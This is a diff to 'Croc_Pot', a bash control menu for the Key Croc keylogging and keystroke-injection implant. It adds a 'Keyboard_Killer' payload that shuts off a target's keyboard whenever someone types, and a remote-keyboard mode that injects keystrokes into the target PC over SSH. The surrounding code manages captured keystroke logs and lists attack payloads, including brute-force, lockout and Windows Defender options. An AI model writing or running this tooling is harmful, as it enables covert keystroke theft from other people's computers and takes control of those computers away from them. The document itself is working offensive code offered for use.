@@ -5,7 +5,7 @@
 # Description:   Send E-mail, Status of keycroc, Basic Nmap, TCPdump, Install payload,
 #                SSH to HAK5 gear, Reverse ssh tunnel, and more
 # Author:        Spywill
-# Version:       1.7.3
+# Version:       1.7.4
 # Category:      Key Croc
 ##
 ##
@@ -128,6 +128,17 @@ else
 	timedatectl set-timezone ${croc_timezone}
 fi
 ##
+#----check if keyboard PRESENT or MISSING with (KEYBOARD) command
+##
+keyboard_check() {
+if [[ $(KEYBOARD) = PRESENT ]]; then
+	echo -ne "${yellow}KEYBOARD: ${clear}${green}PRESENT $(cat /tmp/mode)${clear}\n"
+elif [[ $(KEYBOARD) = MISSING ]]; then
+	echo -ne "${yellow}KEYBOARD: ${clear}${red}MISSING${clear}\n"
+fi
+}
+keyboard_check
+##
 #----Croc_Pot title function
 ##
 function croc_title() {
@@ -147,7 +158,7 @@ fi
 #----Croc_Pot title display info
 ##
 	echo -ne "\n\n\e[41;38;5;232;1m${LINE}${clear}
-${green}»»»»»»»»»»»» CROC_POT ««««««««${clear}${yellow}VER:1.7.3${clear}${green}${clear}\e[41;38;5;232m${array[1]}${clear}${yellow} $(hostname) IP: $(awk -v m=20 '{printf("%-20s\n", $0)}' <<< $(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-))${clear}$(internet_test)${clear}
+${green}»»»»»»»»»»»» CROC_POT ««««««««${clear}${yellow}VER:1.7.4${clear}${green}${clear}\e[41;38;5;232m${array[1]}${clear}${yellow} $(hostname) IP: $(awk -v m=20 '{printf("%-20s\n", $0)}' <<< $(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-))${clear}$(internet_test)${clear}
 ${blue}AUTHOR: ${clear}${yellow}SPYWILL${clear}${cyan}   $(awk -v m=21 '{printf("%-21s\n", $0)}' <<< $(uptime -p | sed 's/up/CROC UP:/g' | sed 's/hours/hr/g' | sed 's/hour/hr/g' | sed 's/,//g' | sed 's/minutes/min/g' | sed 's/minute/min/g'))${clear}\e[41;38;5;232m§${clear}${yellow} $(hostname) VER: $(cat /root/udisk/version.txt) ${clear}${cyan}*${clear}${yellow}TARGET-PC:${clear}${green}$(awk -v m=10 '{printf("%-10s\n", $0)}' <<< $(OS_CHECK))${clear}
 ${blue}$(awk -v m=17 '{printf("%-17s\n", $0)}' <<< ${croc_timezone})${clear}${cyan} $(date +%b-%d-%y-%r)${clear}\e[41;38;5;232mΩ${clear}${yellow} KEYBOARD:${clear}${green}$(sed -n 9p /root/udisk/config.txt | sed 's/DUCKY_LANG //g' | sed -e 's/\(.*\)/\U\1/') ${clear}${yellow}ID:${clear}${green}${k_b}${clear}
 \e[40;38;5;202m»»»»»»»»»»»» ${clear}${red}KEYCROC${clear}\e[40m-${clear}${red}HAK${clear}\e[40m${array[0]}${clear}\e[40;38;5;202m «««««««««««««${clear}\e[41;38;5;232m${array[2]}${clear}${yellow} TEMP:${clear}${cyan}$(cat /sys/class/thermal/thermal_zone0/temp)°C${clear}${yellow} USAGE:${clear}${cyan}$(awk -v m=6 '{printf("%-6s\n", $0)}' <<< $(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - $1"%"}'))${clear}${yellow}MEM:${clear}${cyan}$(awk -v m=13 '{printf("%-13s\n", $0)}' <<< $(free -m | awk 'NR==2{printf "%.2f%%", $3/$2*100 }'))${clear}
@@ -162,6 +173,7 @@ broken=0
 break_script() {
 	broken=1
 }
+trap break_script SIGINT
 }
 ##
 #----Croc_Pot title for loot
@@ -708,7 +720,7 @@ whois_scan() {
 -Whois Lookup scan enter IP or web site name
 -Requirements: WHOIS')\n\n"
 	install_package whois WHOIS whois_scan croc_recon
-	scan_all whois_scan whois
+	scan_all whois_scan whois -H
 }
 ##
 #----Recon DNS lookup scan
@@ -745,7 +757,6 @@ target_port() {
 	read_all ENTER IP OR WEB SITE NAME AND PRESS [ENTER] ; n_ip=${r_a}
 	read_all ENTER PORT RANGE FOR SCAN AND PRESS [ENTER] ; range_port=${r_a}
 	reset_broken
-	trap break_script SIGINT
 for (( PORT = 1; PORT < $range_port; ++PORT )); do
 	nc -z -w 1 "$n_ip" "$PORT" < /dev/null;
 if [ $? -eq 0 ]; then
@@ -5244,7 +5255,6 @@ case $r_a in
 [yY] | [yY][eE][sS])
 	local i=1
 	reset_broken
-	trap break_script SIGINT
 	Q GUI d
 while true ;do
 	LED ATTACK
@@ -5437,7 +5447,6 @@ local NUMBER_N=${U_N}
 local tL=`awk 'NF!=0 {++c} END {print c}' $WORDFILE`
 	local i=1
 	reset_broken
-	trap break_script SIGINT
 while true ; do
 	LED B
 	unset rnum R_W
@@ -5524,23 +5533,23 @@ case $r_a in
 	fi
 local i=1
 reset_broken
-trap break_script SIGINT
 Q GUI-l
 Q CONTROL-ALT-F3
 while true ; do
 LED ATTACK
 WAIT_FOR_KEYBOARD_ACTIVITY 0
+if [ $broken -eq 1 ]; then
+	LED B
+	sleep 1
+	LED OFF
+	break
+else
 	Q CONTROL-SHIFT-LEFTARROW
 	Q BACKSPACE
 	Q CONTROL-SHIFT-LEFTARROW
 	Q BACKSPACE
 	echo -ne "${yellow}KEYCROC HAS DELETE USER INPUT COUNT: ${clear}${green}$(( i++ ))\033[0K\r${clear}"
 	LED R
-if [ $broken -eq 1 ]; then
-	LED B
-	sleep 1
-	LED OFF
-	break
 fi
 done ;;
 [nN] | [nN][oO])
@@ -5650,7 +5659,6 @@ fi
 [yY] | [yY][eE][sS])
 	local i=1
 	reset_broken
-	trap break_script SIGINT
 WAIT_FOR_KEYBOARD_ACTIVITY 0
 while true ; do
 WAIT_FOR_KEYBOARD_ACTIVITY 0
@@ -5743,7 +5751,6 @@ case $r_a in
 [yY] | [yY][eE][sS])
 	local i=1
 	reset_broken
-	trap break_script SIGINT
 	WAIT_FOR_KEYBOARD_ACTIVITY 0
 	WAIT_FOR_KEYBOARD_ACTIVITY 0
 	while true ; do
@@ -5765,17 +5772,79 @@ case $r_a in
 esac
 }
 ##
+#----Keyboard_Killer Payload stop all keyboard active with ATTACKMODE OFF command
+##
+kb_killer() {
+	clear
+	echo -ne "$(Info_Screen '
+-Keyboard_Killer payload match word killkeyboard
+-Stop all keyboard active with ATTACKMODE OFF command
+-Any keyboard activity will run ATTACKMODE OFF command
+-Any keyboard inactivity for 10 sec will run ATTACKMODE HID 
+-When running payload type stop to end loop
+-PRESS CTRL + C to stop loop in terminal')\n\n"
+##
+#----Keyboard_Killer payload install
+##
+local kb_k=/root/udisk/payloads/Keyboard_Killer.txt
+	if [ -e "${kb_k}" ]; then
+	echo -ne "\n$(ColorGreen 'KEYBOARD_KILLER PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER')\n"
+	echo -ne "\n${LINE}\n" ; cat ${kb_k} ; echo -ne "\n${LINE}\n"
+else
+read_all INSTALL KEYBOARD_KILLER PAYLOAD Y/N AND PRESS [ENTER]
+case $r_a in
+[yY] | [yY][eE][sS])
+	echo -ne "# Title:           Keyboard_Killer\n# Description:     Stop all keyboard active with ATTACKMODE OFF command\n#                  Type stop to end loop\n# Author:          spywill\n# Version:         1.0\n# Category:        Key Croc\n
+MATCH killkeyboard\n\nSAVEKEYS /tmp/keyboard_stop.txt UNTIL stop\n\nwhile true; do\nif [ \$(sed -n 's/.*\(stop\).*/\1/p' /tmp/keyboard_stop.txt.filtered) = \"stop\" ]; then\n	LED G\n	RELOAD_PAYLOADS\n	break\nelse
+	if WAIT_FOR_KEYBOARD_ACTIVITY 1 ; then\n	ATTACKMODE OFF\n	LED ATTACK\n	fi\n	if WAIT_FOR_KEYBOARD_INACTIVITY 10 ; then\n	ATTACKMODE HID\n	LED B\n	fi\nfi\ndone\n" >> ${kb_k}
+	echo -ne "\n$(ColorGreen 'KEYBOARD_KILLER PAYLOAD IS NOW INSTALLED CHECK PAYLOADS FOLDER')\n"
+	echo -ne "\n${LINE}\n" ; cat ${kb_k} ; echo -ne "\n${LINE}\n" ;;
+[nN] | [nN][oO])
+	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
+*)
+	invalid_entry ; kb_killer ;;
+esac
+fi
+##
+#----Keyboard_Killer payload run from terminal
+##
+	read_all START KEYBOARD_KILLER Y/N AND PRESS [ENTER]
+	case $r_a in
+[yY] | [yY][eE][sS])
+	local i=1
+	reset_broken
+	while true; do
+	if [ $broken -eq 1 ]; then
+		break
+	else
+	if WAIT_FOR_KEYBOARD_ACTIVITY 1 ; then
+		echo -ne "${yellow}keyboard: ${clear}${red}deactivated ${clear}${yellow}COUNT: ${clear}${green}$((i++))\033[0K\r${clear}"
+		ATTACKMODE OFF &>/dev/null
+	fi
+	if WAIT_FOR_KEYBOARD_INACTIVITY 10 ; then
+		echo -ne "${yellow}keyboard: ${clear}${green}activated ${clear}${yellow}COUNT: ${clear}${green}$((i++))\033[0K\r${clear}"
+		ATTACKMODE HID &>/dev/null
+	fi
+	fi
+	done ;;
+[nN] | [nN][oO])
+	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
+*)
+	invalid_entry ; kb_killer ;;
+esac
+}
+##
 #----Install Payloads Menu
 ##
 MenuTitle INSTALL PAYLOADS MENU ; MenuColor 22 1 GETONLINE PAYLOAD ; MenuColor 22 2 CROC_UNLOCK PAYLOAD ; MenuColor 22 3 WIFI SETUP PAYLOAD ; MenuColor 22 4 QUICK START CROC_POT
 MenuColor 22 5 CROC_SHOT PAYLOAD ; MenuColor 22 6 CROC_BITE PAYLOAD ; MenuColor 22 7 CROC_REDIRECT PAYLOAD ; MenuColor 22 8 NO SLEEPING PAYLOAD ; MenuColor 22 9 CROC_REPLACE PAYLOAD
 MenuColor 21 10 CROC_FORCE PAYLOAD ; MenuColor 21 11 CROC_LOCKOUT PAYLOAD ; MenuColor 21 12 WINDOWS DEFENDER ; MenuColor 21 13 CROC_CLOSE_IT PAYLOAD
-MenuColor 21 14 DOUBLE_UP PAYLOAD ; MenuColor 21 15 QUACK_ATTACK PAYLOAD ; MenuColor 21 16 RETURN TO MAIN MENU ; MenuEnd 25
+MenuColor 21 14 DOUBLE_UP PAYLOAD ; MenuColor 21 15 QUACK_ATTACK PAYLOAD ; MenuColor 21 16 KEYBOARD_KILLER ; MenuColor 21 17 RETURN TO MAIN MENU ; MenuEnd 25
 	case $m_a in
 	1) get_online_p ; install_payloads ;; 2) croc_unlock_p ; install_payloads ;; 3) wifi_setup_p ; install_payloads ;; 4) quick_croc_pot ; install_payloads ;; 5) screen_shot ; install_payloads ;;
 	6) croc_bite ; install_payloads ;; 7) web_site ; install_payloads ;; 8) screen_on ; install_payloads ;; 9) text_replace ; install_payloads ;; 10) Brute_force ; install_payloads ;;
 	11) croc_lock ; install_payloads ;; 12) windows_defender ; install_payloads ;; 13) close_it ; install_payloads ;;
-	14) double_up ; install_payloads ;; 15) q_attack ; install_payloads ;; 16) main_menu ;; 0) exit 0 ;; [bB]) menu_B ;; *) invalid_entry ; install_payloads ;;
+	14) double_up ; install_payloads ;; 15) q_attack ; install_payloads ;; 16) kb_killer ; install_payloads ;; 17) main_menu ;; 0) exit 0 ;; [bB]) menu_B ;; *) invalid_entry ; install_payloads ;;
 	esac
 }
 ##
@@ -6065,7 +6134,6 @@ q_target() {
 	case $r_a in
 	[yY] | [yY][eE][sS])
 reset_broken
-trap break_script SIGINT
 while true ; do
 	if [ $broken -eq 1 ]; then
 		LED B
@@ -6118,7 +6186,6 @@ case $r_a in
 [yY] | [yY][eE][sS])
 	local i=1
 	reset_broken
-	trap break_script SIGINT
 	while true; do
 		LED ATTACK
 		read_all ENTER CHARACTERS TO REPLACE AND PRESS [ENTER]
@@ -6148,12 +6215,12 @@ esac
 #----View if target Keyboard activity or inactivity
 ##
 kb_activity() {
+	clear
 	echo -ne "$(Info_Screen '
 -Indicate if target Keyboard is activity or inactivity
 -PRESS CTRL + C to stop loop in terminal')\n\n"
 local i=1
 reset_broken
-trap break_script SIGINT
 while WAIT_FOR_KEYBOARD_ACTIVITY 0 ; do
 	if [ $broken -eq 1 ]; then
 		break
@@ -6161,7 +6228,6 @@ while WAIT_FOR_KEYBOARD_ACTIVITY 0 ; do
 		echo -ne "${yellow}KEYBOARD: ${clear}${green}ACTIVITY ${clear}${yellow}COUNT: ${clear}${green}$((i++))\033[0K\r${clear}"
 	fi
 done &
-trap break_script SIGINT
 while WAIT_FOR_KEYBOARD_INACTIVITY 1 ; do
 	if [ $broken -eq 1 ]; then
 		break
@@ -6171,13 +6237,82 @@ while WAIT_FOR_KEYBOARD_INACTIVITY 1 ; do
 done
 }
 ##
+#----Keycroc Remote keyboard Enter keystroke entry from remote device
+##
+remote_keyboard() {
+	clear
+	echo -ne "$(Info_Screen '
+-Keycroc Remote keyboard
+-Enter keystroke entry from remote device
+-Start remote ssh session with keycroc then run
+Croc_Pot with typing /root/udisk/tools/Croc_Pot.sh
+select this option and start typing in remote terminal
+keystroke entry should display on target pc
+
+NOTE: Not all keystroke entry are working at the moment
+-Ctrl+?, ESC, ALT, combination keys
+
+-PRESS CTRL + C to stop loop in terminal
+-Press F1 to return back to Croc_Pot menu')\n\n"
+	read_all START REMOTE KEYBOARD Y/N AND PRESS [ENTER]
+	case $r_a in
+[yY] | [yY][eE][sS])
+read_key_press() {
+if IFS= read -s -r -n1 key_press; then
+	while read -sN1 -t 0.001 ; do
+		key_press+="${REPLY}"
+	done
+fi
+}
+declare -a fnkey
+for x in {1..12}; do
+	raw=$(tput kf$x | cat -A)
+	fnkey[$x]=${raw#^[}
+done
+while read_key_press; do
+case "${key_press}" in
+	$'\e'${fnkey[1]}) break ;;
+	$'\e'${fnkey[2]}) Q F2 ; echo -ne " F2 " ;;
+	$'\e'${fnkey[3]}) Q F3 ; echo -ne " F3 " ;;
+	$'\e'${fnkey[4]}) Q F4 ; echo -ne " F4 " ;;
+	$'\e'${fnkey[5]}) Q F5 ; echo -ne " F5 " ;;
+	$'\e'${fnkey[6]}) Q F6 ; echo -ne " F6 " ;;
+	$'\e'${fnkey[7]}) Q F7 ; echo -ne " F7 " ;;
+	$'\e'${fnkey[8]}) Q F8 ; echo -ne " F8 " ;;
+	$'\e'${fnkey[9]}) Q F9 ; echo -ne " F9 " ;;
+	$'\e'${fnkey[10]}) Q F10 ; echo -ne " F10 " ;;
+	$'\e'${fnkey[11]}) Q F11 ; echo -ne " F11 " ;;
+	$'\e'${fnkey[12]}) Q F12 ; echo -ne " F12 " ;;
+	^D) exit ;;
+	$'\E[A') Q UPARROW ; echo -ne " UPARROW " ;;
+	$'\E[B') Q DOWNARROW ; echo -ne " DOWNARROW " ;;
+	$'\E[C') Q RIGHTARROW ; echo -ne " RIGHTARROW " ;;
+	$'\E[D') Q LEFTARROW ; echo -ne " LEFTARROW " ;;
+	$'\177') Q BACKSPACE ; echo -ne "\b \b" ;;
+	$'\0') Q ENTER ; echo -ne " ENTER \n" ;;
+	$'\x20') Q KEYCODE 00,00,2c ; echo -ne " " ;;
+	*)
+if [[ "$key_press" == [[:graph:]] ]]; then
+	Q STRING "$key_press" ; echo -ne "$key_press"
+elif [[ "$key_press" == "	" ]]; then
+	Q TAB ; echo -ne " TAB "
+fi ;;
+esac
+done ;;
+[nN] | [nN][oO])
+	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
+*)
+	invalid_entry ; remote_keyboard ;;
+esac
+}
+##
 #----Quack Explore command Menu
 ##
 MenuTitle QUACK EXPLORE MENU ; MenuColor 21 1 QUACK TARGET TERMINAL ; MenuColor 21 2 QUACK OVER SSH ; MenuColor 21 3 QUACK TARGET PC ; MenuColor 21 4 PAYLOAD STARTER
-MenuColor 21 5 REMOTE REPLACE ; MenuColor 21 6 KEYBOARD ACTIVITY ; MenuColor 21 7 RETURN TO MAIN MENU ; MenuEnd 24
+MenuColor 21 5 REMOTE REPLACE ; MenuColor 21 6 KEYBOARD ACTIVITY ; MenuColor 21 7 REMOTE KEYBOARD ; MenuColor 21 8 RETURN TO MAIN MENU ; MenuEnd 24
 	case $m_a in
 	1) q_terminal ; insert_quack ;; 2) q_ssh ; insert_quack ;; 3) q_target ; insert_quack ;; 4) remote_payload ; insert_quack ;;
-	5) remote_replace ; insert_quack ;; 6) kb_activity ; insert_quack ;; 7) main_menu ;; 0) exit 0 ;; [bB]) menu_B ;; *) invalid_entry ; insert_quack ;;
+	5) remote_replace ; insert_quack ;; 6) kb_activity ; insert_quack ;; 7) remote_keyboard ; insert_quack ;; 8) main_menu ;; 0) exit 0 ;; [bB]) menu_B ;; *) invalid_entry ; insert_quack ;;
 	esac
 }
 ##
@@ -6272,7 +6407,7 @@ IP: $(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-) $(ifconf
 INTERFACE: $(ip route show default | awk '/default/ {print $5}')\nMODE: $(cat /tmp/mode)\nSSH: root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)\nDNS: $(sed -n -e 4p /etc/resolv.conf)\nDNS: $(sed -n -e 5p /etc/resolv.conf)\nDISPLAY ARP: $(ip n)\n${LINE}\nROUTE TALBE: $(ip r)\nNETWORK:\n$(ifconfig -a)\n${LINE}\nSYSTEM UPTIME: $(uptime)\n
 SYSTEM INFO: $(uname -a)\n${LINE}\nUSB DEVICES:\n$(usb-devices)\n${LINE}\nBASH VERSION:\n$(apt-cache show bash)\n${LINE}\nLINUX VERSION:\n$(cat /etc/os-release)\n${LINE}\nSSH KEY:\n$(ls -al ~/.ssh)\n$(cat ~/.ssh/id_rsa.pub)\n${LINE}\n
 MEMORY USED:\n$(free -m)\n$(cat /proc/meminfo)\n${LINE}\nSHOW PARTITION FORMAT:\n$(lsblk -a)\n${LINE}\nSHOW DISK USAGE:\n$(df -TH)\n\t${LINE_A}>MORE DETAIL<${LINE_A}\n$(fdisk -l)\n${LINE}\nCHECK USER LOGIN:\n$(lastlog)\n${LINE}\nCURRENT PROCESS:\n$(ps aux)\n${LINE}\nCPU INFORMATION:\n$(more /proc/cpuinfo)\n$(lscpu | grep MHz)\n${LINE}\nCHECK PORT:\n$(netstat -tulpn)\n
-${LINE}\nRUNNING SERVICES:\n$(service --status-all)\n${LINE}\nINSTALLED PACKAGES:\n$(dpkg-query -l)\n${LINE}\nIDENTIFIER (UUID):\n$(blkid)\n${LINE}\nDIRECTORIES:\n$(ls -la -r /etc /var /root /tmp /usr /sys /bin /sbin)\n${LINE}\nDISPLAY TREE:\n$(pstree)\n${LINE}\nSHELL OPTIONS:\n$(shopt)\n${LINE}\n" >> ${LOOT_INFO} ; curl -Lsf --connect-timeout 2 --max-time 2 http://ip-api.com ; echo "${LINE}"
+${LINE}\nRUNNING SERVICES:\n$(service --status-all)\n${LINE}\nINSTALLED PACKAGES:\n$(dpkg-query -l)\n${LINE}\nIDENTIFIER (UUID):\n$(blkid)\n${LINE}\nDIRECTORIES:\n$(ls -la -r /etc /var /root /tmp /usr /sys /bin /sbin)\n${LINE}\nDISPLAY TREE:\n$(pstree)\n${LINE}\nSHELL OPTIONS:\n$(shopt)\n${LINE}\n$(CHECK_PAYLOADS)\n${LINE}" >> ${LOOT_INFO} ; curl -Lsf --connect-timeout 2 --max-time 2 http://ip-api.com ; echo "${LINE}"
 	cat ${LOOT_INFO}
 }
 ##
@@ -6319,6 +6454,7 @@ key_file() {
 -Keycroc loot/croc_char.log file
 -Scan loot/croc_char.log for match word/pattern
 -View live keystrokes')\n"
+keyboard_check
 echo -ne "${yellow}Currently found ${clear}${green}$(cat /root/udisk/loot/croc_char.log | wc -m) ${clear}${yellow}characters in croc_char.log${clear}\n\n"
 ##
 #----View Live keystrokes with payload
@@ -6437,7 +6573,6 @@ else
 	invalid_entry ; echo -ne "\n${red}Did not find Word list please try again${clear}\n" ; list_check
 fi
 	reset_broken
-	trap break_script SIGINT
 while IFS= read -r word; do
 	LED B
 	if [ ${word} = `sed -n 's/.*\('${word}'\).*/\1/p' /root/udisk/loot/croc_char.log` 2> /dev/null ]; then
@@ -6543,7 +6678,10 @@ list_match() {
 	clear
 	echo -ne "$(Info_Screen '
 -List all MATCH words in payloads folder
--Option to change MATCH words')\n\n"
+-Option to change MATCH words
+-View installed payloads')\n\n"
+CHECK_PAYLOADS
+echo -ne "\e[48;5;202;30m${LINE}${clear}\n\n"
 if [ "$(OS_CHECK)" = WINDOWS ]; then
 	grep MATCH* /root/udisk/payloads/*.txt
 elif [ "$(OS_CHECK)" = LINUX ]; then
@@ -7875,59 +8013,49 @@ MenuEnd 23
 function croc_recovery() {
 	clear
 	echo -ne "$(Info_Screen '
--Download The lastest firmware from Hak5
--This will save the Firmware to the keycroc tools folder
+-Download/install The lastest firmware from Hak5
+-This will save the Firmware to root of the KeyCroc drive
 -Restore the keycroc firmware with the lastest firmware
--factory recovery will open Hak5 factory recovery web page
--Remove this will remove the lastest firmware from tools folder')\n"
+-Keycroc-docs @ https://docs.hak5.org/key-croc/
+-Change timezone')\n"
 ##
-#----Download lastest keycroc firmware save to /root/udisk/tools
+#----Download lastest keycroc firmware save to /root/udisk
 ##
 croc_firmware() {
 	clear
 	echo -ne "$(Info_Screen '
 -This will Download KeyCroc lastest firmware from Hak5
--Download center and place it in the tools folder
--for later recovery, Download may take some time')\n"
-if [ -e /root/udisk/tools/kc_fw_1.3_510.tar.gz ]; then
+Download center and place on root of the KeyCroc drive
+-Download may take some time
+-This will Verify sha256 checksum after download
+-3356d9f80dedd4c3afd0a9014e966a692272f83ff3256e8a2a3dd4e60544740e
+-After download unplug keycroc plug back in
+-Wait until the LED RED & BLUE stop flashing')\n"
+if [ -e /root/udisk/kc_fw_1.3_510.tar.gz ]; then
 	echo -ne "\n$(ColorGreen 'KeyCroc lastest firmware file already exists')\n"
 else
-	read_all DOWNLOAD LASTEST KEYCROC FIRMWARE Y/N AND PRESS [ENTER]
+	read_all DOWNLOAD/INSTALL LASTEST KEYCROC FIRMWARE Y/N AND PRESS [ENTER]
 case $r_a in
 [yY] | [yY][eE][sS])
 	echo -ne "\n$(ColorYellow '-Downloading KeyCroc lastest firmware')\n"
-	wget https://storage.googleapis.com/hak5-dl.appspot.com/keycroc/firmwares/1.3-stable/kc_fw_1.3_510.tar.gz -P /root/udisk/tools ;;
+	wget https://storage.googleapis.com/hak5-dl.appspot.com/keycroc/firmwares/1.3-stable/kc_fw_1.3_510.tar.gz -P /root/udisk
+	echo -ne "\n${yellow}Verifying SHA256 Checksum with sha256sum command${clear}\n"
+	local CrocFirmware="3356d9f80dedd4c3afd0a9014e966a692272f83ff3256e8a2a3dd4e60544740e"
+	local ckeckFirmware=$(sha256sum /root/udisk/kc_fw_1.3_510.tar.gz | awk '{print $1}')
+	if [[ ${CrocFirmware} == ${ckeckFirmware} ]]; then
+		LED G
+		echo -ne "\n${green}SHA-256 checksum match it is safe to install Firmware unplug keycroc plug back in${clear}\n"
+	else
+		LED R
+		echo -ne "${red}SHA-256 checksum DID NOT match it is not safe to install Firmware removing kc_fw_1.3_510.tar.gz${clear}\n"
+		rm -f /root/udisk/kc_fw_1.3_510.tar.gz
+	fi ;;
 [nN] | [nN][oO])
 	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
 *)
 	invalid_entry ; croc_firmware ;;
 esac
 fi
-}
-##
-#----Restore to lastest keycroc firmware
-##
-restore_firmware() {
-	clear
-	unset r_a
-	echo -ne "\n$(ColorRed 'THIS WILL RESTORE THE KEYCROC TO THE LATEST FIRMWARE\n
-	ARE YOU SURE Y/N AND PRESS [ENTER]:')"; read -p $(echo -ne "\e[30;42m") r_a && echo -ne "${clear}"
-case $r_a in
-[yY] | [yY][eE][sS])
-if [ -e /root/udisk/tools/kc_fw_1.3_510.tar.gz ]; then
-	echo -ne "$(ColorYellow 'Moving Firmware to KeyCroc udisk
-	This will take an couple of minutes')\n"
-	cp /root/udisk/tools/kc_fw_1.3_510.tar.gz /root/udisk
-	echo -ne "$(ColorGreen 'now unplug the KeyCroc and plug back in')\n"
-else
-	echo -ne "$(ColorRed 'DID NOT FIND KEYCROC FIRMWARE FILE PLEASE DOWNLOAD')\n"
-fi ;;
-[nN] | [nN][oO])
-	echo -ne "\n$(ColorYellow 'Returning back to menu')\n"
-	croc_recovery ;;
-*)
-	invalid_entry ; restore_firmware ;;
-esac
 }
 ##
 #----recovery repair locale LANG=en_US.UTF-8
@@ -7971,7 +8099,7 @@ case $CROC_POT_REMOVE in
 	rm /root/udisk/tools/kc_fw_1.3_510.tar.gz /root/udisk/payloads/Croc_Pot_Payload.txt /root/udisk/payloads/Croc_Bite.txt.txt /usr/local/bin/cht.sh
 	rm /root/udisk/payloads/Croc_unlock_1.txt /root/udisk/payloads/Croc_unlock_2.txt /root/udisk/payloads/No_Sleeping.txt /root/udisk/payloads/Croc_close_it.txt
 	rm /root/udisk/payloads/Getonline_Raspberry.txt /root/udisk/payloads/Quick_Start_C2.txt /root/udisk/payloads/Croc_replace.txt /root/udisk/payloads/Live_keystroke.txt
-	rm /root/udisk/payloads/Quick_start_Croc_Pot.txt /root/udisk/payloads/Getonline_Windows.txt /root/udisk/payloads/Croc_Force_payload.txt
+	rm /root/udisk/payloads/Quick_start_Croc_Pot.txt /root/udisk/payloads/Getonline_Windows.txt /root/udisk/payloads/Croc_Force_payload.txt /root/udisk/payloads/Keyboard_Killer.txt
 	rm /root/udisk/tools/Croc_Pot/Croc_OS.txt /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt /root/udisk/payloads/Croc_Defender.txt /root/udisk/payloads/Quack_Attack.txt
 	rm /root/udisk/tools/Croc_Pot.sh /root/udisk/payloads/Croc_Shot.txt /root/udisk/payloads/Croc_Shell.txt /root/udisk/payloads/Double_up.txt
 	apt-get autoremove
@@ -8080,11 +8208,11 @@ esac
 ##
 #----Recovery main menu
 ##
-MenuTitle KEYCROC RECOVERY MENU ; MenuColor 27 1 DOWNLOAD LATEST FIRMWARE ; MenuColor 27 2 FACTORY RESET HOW TO ; MenuColor 27 3 RESTORE LASTEST FIRMWARE ; MenuColor 27 4 REMOVE LASTEST FIRMWARE ; MenuColor 27 5 REPAIR en_US.UTF-8 ERROR
-MenuColor 27 6 KEYCROC UPDATE PACKAGES ; MenuColor 27 7 REMOVE CROC_POT AN CONTENTS ; MenuColor 27 8 REBOOT/SHUTDOWN TARGET PC ; MenuColor 27 9 CHANGE KEYCROC TIMEZONE ; MenuColor 26 10 RETURN TO MAIN MENU ; MenuEnd 30
+MenuTitle KEYCROC RECOVERY MENU ; MenuColor 27 1 DOWNLOAD LATEST FIRMWARE ; MenuColor 27 2 KEYCROC DOCS.HAK5 WEBSITE ; MenuColor 27 3 REPAIR en_US.UTF-8 ERROR ; MenuColor 27 4 KEYCROC UPDATE PACKAGES
+MenuColor 27 5 REMOVE CROC_POT AN CONTENTS ; MenuColor 27 6 REBOOT/SHUTDOWN TARGET PC ; MenuColor 27 7 CHANGE KEYCROC TIMEZONE ; MenuColor 26 8 RETURN TO MAIN MENU ; MenuEnd 30
 	case $m_a in
-	1) croc_firmware ; croc_recovery ;; 2) start_web https://docs.hak5.org/hc/en-us/articles/360048657394-Factory-Reset ; croc_recovery ;; 3) restore_firmware ; croc_recovery ;; 4) echo -ne "\n$(ColorYellow 'Removing lastest firmware file from tools folder')\n" ; rm /root/udisk/tools/kc_fw_1.3_510.tar.gz ; croc_recovery ;;
-	5) locale_en_US ; croc_recovery ;; 6) croc_update ; croc_recovery ;; 7) remove_croc_pot ;; 8) reboot_shutdown ; croc_recovery ;; 9) croc_clock ; croc_recovery ;; 10) main_menu ;; 0) exit 0 ;; [bB]) main_menu ;; *) invalid_entry ; croc_recovery ;;
+	1) croc_firmware ; croc_recovery ;; 2) start_web https://docs.hak5.org/key-croc/ ; croc_recovery ;; 3) locale_en_US ; croc_recovery ;; 4) croc_update ; croc_recovery ;;
+	5) remove_croc_pot ;; 6) reboot_shutdown ; croc_recovery ;; 7) croc_clock ; croc_recovery ;; 8) main_menu ;; 0) exit 0 ;; [bB]) main_menu ;; *) invalid_entry ; croc_recovery ;;
 	esac
 }
 ##
